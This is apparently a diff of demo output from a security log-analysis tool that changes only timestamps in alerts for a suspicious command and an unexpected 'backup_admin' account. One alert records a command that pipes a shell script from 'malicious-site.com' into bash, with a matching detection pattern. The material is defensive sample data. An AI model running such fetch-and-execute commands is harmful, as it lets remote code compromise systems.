@@ -1,7 +1,7 @@
 {
     "log_file": "Demo Analysis",
     "log_type": "Mixed (Windows + Linux)",
-    "analysis_time": "2025-07-31T10:56:39.782652",
+    "analysis_time": "2025-08-13T12:09:34.572951",
     "total_events": 27,
     "alerts": [
         {
@@ -182,13 +182,13 @@
             "type": "suspicious_command",
             "severity": "MEDIUM",
             "description": "Suspicious command pattern detected",
-            "timestamp": "2025-07-31T09:06:39.779651",
+            "timestamp": "2025-08-13T10:19:34.568441",
             "user": "www-data",
             "command": "/bin/bash -c \"curl -s http://malicious-site.com/shell.sh | bash\"",
             "pattern": "curl.*\\|\\s*bash",
             "computer": "web-server-01",
             "event": {
-                "timestamp": "2025-07-31T09:06:39.779651",
+                "timestamp": "2025-08-13T10:19:34.568441",
                 "hostname": "web-server-01",
                 "process": "sudo",
                 "event_type": "authentication",
@@ -205,12 +205,12 @@
             "type": "suspicious_user_creation",
             "severity": "HIGH",
             "description": "Suspicious user account created: backup_admin",
-            "timestamp": "2025-07-31T10:26:39.779651",
+            "timestamp": "2025-08-13T11:39:34.568441",
             "created_user": "backup_admin",
             "created_by": "Unknown",
             "computer": "db-server-02",
             "event": {
-                "timestamp": "2025-07-31T10:26:39.779651",
+                "timestamp": "2025-08-13T11:39:34.568441",
                 "hostname": "db-server-02",
                 "process": "useradd",
                 "event_type": "authentication",
